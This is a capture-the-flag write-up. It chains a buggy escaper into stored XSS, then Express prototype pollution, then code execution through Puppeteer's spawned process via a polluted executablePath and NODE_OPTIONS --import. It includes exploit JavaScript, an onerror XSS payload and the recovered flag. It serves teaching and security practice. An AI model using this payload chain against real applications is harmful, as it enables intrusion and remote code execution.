# Fishies — writeup

Category: web Difficulty: 3
Target: http://10.83.3.123/ (Express 5 / Handlebars 4.7.10 / Puppeteer 25.16.0, Node 26)

Flag:

PP{h1jack1ng_th3_d3bugg3r_w1th_f1sh13s::2Fvfrje9CS9U}

## 1. Buggy escaper -> stored XSS

`server.js` has a hand-rolled escaper:

```js
function escape(value) {
 let escaped = String(value);
 for (let index = 0; index < escaped.length; index++) {
 const replacement = escaped[index] === '<' ? '&lt;' : escaped[index] === '>' ? '&gt;' : null;
 if (!replacement) continue;
 escaped = escaped.slice(0, index) + replacement + escaped.slice(index + 1);
 index += replacement.length; // BUG: skips the char now sitting right after the replacement
 }
 return escaped;
}
```

After replacing a `<`/`>` (`&lt;`/`&gt;`, 4 chars) it advances by 4 then the loop `index++`
skips one more char. So the character immediately following an escaped one is never escaped.
`><img ...>` therefore leaves a raw `<`:

 "><img src=x onerror=alert(1)>>" -> "&gt;<img src=x onerror=\"alert(1)\"&gt;>"

`fishView` renders `reviewAscii = escape(fish.ascii)` **raw** with `{{{ }}}` inside `<pre>`
(templates/index.html line 45). POST /api/fish lets anyone add a fish; POST
/api/fish/:id/report sends the admin bot to `/#fish<id>` where the template is cloned into the
dialog and the `<img onerror>` fires. Verified: the payload executed as admin.

## 2. Admin primitive

The bot has `admin=<token>` (httpOnly, 127.0.0.1). From the XSS we get two admin capabilities:

* `PATCH /api/admin/fish/:id/fishData` (merge, requires admin)
* `POST /api/admin/fetch` (loopback-only SSRF, requires admin)

The SSRF only reaches loopback port 80 (the app itself); there is no inspector/other service
(9229/9222 refused). It is a dead-end for direct file read.

## 3. Prototype pollution in `combine`

```js
function combine(target, source) {
 for (const key of Object.keys(source))
 if (obj(source[key])) { if (!target[key]) target[key] = {}; combine(target[key], source[key]); }
 else target[key] = source[key];
}
```

`JSON.parse('{"__proto__":{...}}')` creates an **own** `__proto__` data property, so
`Object.keys` yields it, `obj(source['__proto__'])` is true, `target['__proto__']` resolves to
`Object.prototype` (truthy, so not overwritten) and `combine(Object.prototype, payload)` writes
arbitrary keys onto the global prototype. So the admin PATCH body:
`{"__proto__":{"executablePath":...,"env":{...}}}` pollutes `Object.prototype`.

## 4. Prototype pollution -> RCE through Puppeteer's spawn

The app spawns a child on every report: `puppeteer.launch(...)` -> `child_process.spawn(...)`.
Two inherited options are read from `Object.prototype` on that path:

* `executablePath` — `ChromeLauncher.computeLaunchArguments` destructures it from an options
 object that has no own `executablePath`, so the polluted value is used (it must pass
 `existsSync`).
* `env` — `BrowserLauncher.launch` does `env = process.env` only when `options.env === undefined`;
 a polluted `Object.prototype.env` wins, and `@puppeteer/browsers` passes it straight to spawn.

`Object.prototype.shell` does NOT work (Node's `normalizeSpawnArguments` uses a null-prototype
options copy), so the unquoted `--user-data-dir=` shell trick is dead. Instead we point the
executable at an existing **JS shebang script**: `/usr/local/bin/npm` (a symlink to
`npm-cli.js`, `#!/usr/bin/env node`). The kernel then runs `/usr/bin/env node <script> <chrome
flags>`, and because we fully control the child environment we set:

 PATH=/usr/local/bin:/usr/bin:/bin
 NODE_OPTIONS=--import=data:text/javascript,<percent-encoded JS>

The flags arrive as script argv (not node options), so node starts normally, processes
`NODE_OPTIONS` and executes our module via `--import` — as the `node` user, in the app container.

## Exploit (delivered by the admin-bot XSS)

```js
var enc = '<percent-encoded: const f=await import("node:fs"); const d=f.readFileSync("/flag.txt","utf8");' +
 ' f.writeFileSync("/app/static/flagout.txt",d); await fetch("http://127.0.0.1/api/fish",...)>';
var body = '{"__proto__":{"executablePath":"/usr/local/bin/npm","env":{' +
 '"PATH":"/usr/local/bin:/usr/bin:/bin",' +
 '"NODE_OPTIONS":"--import=data:text/javascript,' + enc + '"}}}';
fetch('/api/admin/fish/1/fishData',{method:'PATCH',headers:{'Content-Type':'application/json'},body:body})
 .then(=>fetch('/api/fish/1/report',{method:'POST'})); // launches node -> --import runs
```

Full ascii added via `/api/fish`:

 ><img src=x onerror="(function{ ... })">>

`><` yields the raw `<`; the trailing `>>` yields the raw tag-closing `>`. JS uses single-quoted
strings and `\x22` for JSON quotes so nothing breaks the double-quoted attribute and no `<`/`>`
appears inside the handler.

The imported module reads `/flag.txt`, writes `/app/static/flagout.txt` (served by express.static),
and also POSTs the flag back as a fish as a second channel. `GET /static/flagout.txt` returns:

 PP{h1jack1ng_th3_d3bugg3r_w1th_f1sh13s::2Fvfrje9CS9U}